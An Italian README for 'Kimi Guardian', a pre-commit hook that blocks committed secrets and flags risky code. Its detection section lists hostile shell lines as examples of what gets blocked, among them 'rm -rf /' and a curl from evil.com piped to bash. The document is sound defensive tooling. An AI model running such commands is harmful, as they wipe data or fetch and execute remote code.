# 🔍 Kimi Guardian Pre-commit Hooks

> Blocca secrets e comandi pericolosi prima che finiscano nel repository

---

## 🎯 Cos'è?

I **pre-commit hooks** sono script che Git esegue automaticamente prima di ogni `git commit`.  
Kimi Guardian aggiunge un controllo di sicurezza che:

- 🔍 Analizza i file staged
- 🚫 Blocca i commit con secrets esposti
- ⚠️ Avvisa su comandi shell pericolosi
- 🛡️ Protegge dalla commit accidentale di credenziali

---

## 🚀 Installazione Rapida

### Metodo 1: Script Automatico (Consigliato)

```bash
cd ~/zed-plus-kimi/kimi_guardian
chmod +x install-hooks.sh
./install-hooks.sh
```

### Metodo 2: Comando Python

```bash
# Dalla root del tuo repository Git
python3 -m guardian.precommit install
```

### Metodo 3: Manuale

```bash
# Crea il file .git/hooks/pre-commit
cat > .git/hooks/pre-commit << 'EOF'
#!/bin/bash
python3 -m guardian.precommit check
EOF

chmod +x .git/hooks/pre-commit
```

---

## 📊 Cosa Controlla

### 1. Secrets Detection

| Pattern | Esempio | Pericolo |
|---------|---------|----------|
| AWS Access Key | `AKIAIOSFODNN7EXAMPLE` | Accesso AWS |
| AWS Secret Key | `aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY` | Accesso AWS |
| API Keys | `api_key = "sk-..."` | Accesso servizi |
| Private Keys | `-----BEGIN RSA PRIVATE KEY-----` | Accesso SSH |
| Password | `password = "supersecret123"` | Credential leak |

### 2. Dangerous Code

| Pattern | Pericolo |
|---------|----------|
| `eval(...)` | Code injection |
| `exec(...)` | Code injection |
| `subprocess.*shell=True` | Command injection |

### 3. Shell Scripts

Analizza file `.sh`, `.bash`, `.zsh`:

```bash
# Questo verrebbe bloccato/flaggato:
rm -rf /
curl https://evil.com/script.sh | bash
eval $(curl ...)
```

---

## 🎮 Uso

### Commit Normale

```bash
git add file.py
git commit -m "Add feature"

# Output:
🔍 Controllo 3 file staged...
✅ Nessun problema trovato!
[main abc1234] Add feature
```

### Commit Con Problemi

```bash
git add config.py  # contiene API key
git commit -m "Add config"

# Output:
🔍 Controllo 1 file staged...
🛡️  Trovati 2 problemi:

┌──────────┬───────┬─────────────────┬────────────┐
│ File     │ Linea │ Tipo            │ Contenuto  │
├──────────┼───────┼─────────────────┼────────────┤
│ config.py│ 5     │ secrets: API Key│ api_key=sk-│
│ config.py│ 8     │ secrets: Password│ password=p...│
└──────────┴───────┴─────────────────┴────────────┘

⚠️  Commit Bloccato
```

### Bypass (Emergenza)

```bash
# Salta il controllo (sconsigliato)
git commit --no-verify -m "Emergency fix"
```

---

## ⚙️ Configurazione

### Personalizza Pattern

```python
# ~/.kimi-guardian/precommit_config.py
CUSTOM_PATTERNS = {
    "secrets": {
        "Company Token": r'company_token\s*=\s*["\']\w+["\']',
    },
    "blocked_strings": [
        "TODO: remove before production",
        "HACK:",
        "FIXME: insecure"
    ]
}
```

### Escludi File

```bash
# .guardianignore
*.min.js
vendor/
node_modules/
*.lock
```

---

## 🔄 Workflow Consigliato

### Setup Team

```bash
# 1. Ogni sviluppatore installa
git clone <repo>
cd <repo>
python3 -m guardian.precommit install

# 2. Verifica
python3 -m guardian.precommit status
# ✅ Kimi Guardian hook is installed
```

### CI/CD Integration

```yaml
# .github/workflows/security.yml
name: Security Check
on: [push, pull_request]

jobs:
  guardian:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Run Kimi Guardian
        run: python3 -m guardian.precommit check
```

---

## 📁 Struttura File

```
.git/hooks/
├── pre-commit              # Hook principale
├── pre-commit.backup.*     # Backup automatici
```

---

## 🛠️ Comandi

| Comando | Descrizione |
|---------|-------------|
| `python3 -m guardian.precommit check` | Esegui controllo manuale |
| `python3 -m guardian.precommit install` | Installa hook |
| `python3 -m guardian.precommit uninstall` | Rimuovi hook |
| `python3 -m guardian.precommit status` | Verifica stato |

---

## 🚨 Troubleshooting

### "ModuleNotFoundError"

```bash
pip install rich pyyaml
```

### "Non sei in un repository Git"

```bash
# Devi essere nella root del repo
cd /path/to/your/repo
~/zed-plus-kimi/kimi_guardian/install-hooks.sh
```

### Hook non eseguito

```bash
# Verifica permessi
ls -la .git/hooks/pre-commit
# Deve essere: -rwxr-xr-x (eseguibile)

# Se non lo è:
chmod +x .git/hooks/pre-commit
```

### Falsi Positivi

```bash
# Per questo commit specifico
git commit --no-verify -m "message"

# O aggiungi pattern a .guardianignore
```

---

## 🎯 Best Practices

1. **Installa subito** dopo `git init` o clone
2. **Non usare `--no-verify`** se possibile
3. **Rivedi sempre** i warning prima di bypassare
4. **Aggiorna regole** periodicamente
5. **Educa il team** sui pattern rilevati

---

## 📊 Confronto con Altri Tool

| Tool | Focus | Setup | Kimi Guardian |
|------|-------|-------|---------------|
| **git-secrets** | AWS keys only | Manuale | ✅ Più patterns |
| **detect-secrets** | Entropy scan | YAML config | ✅ Più semplice |
| **talisman** | File size + secrets | Binary | ✅ Pure Python |
| **pre-commit** | Framework generico | Pip + config | ✅ Integrato |

---

> 🔒 **Un commit con una secret è per sempre. Meglio prevenire!**
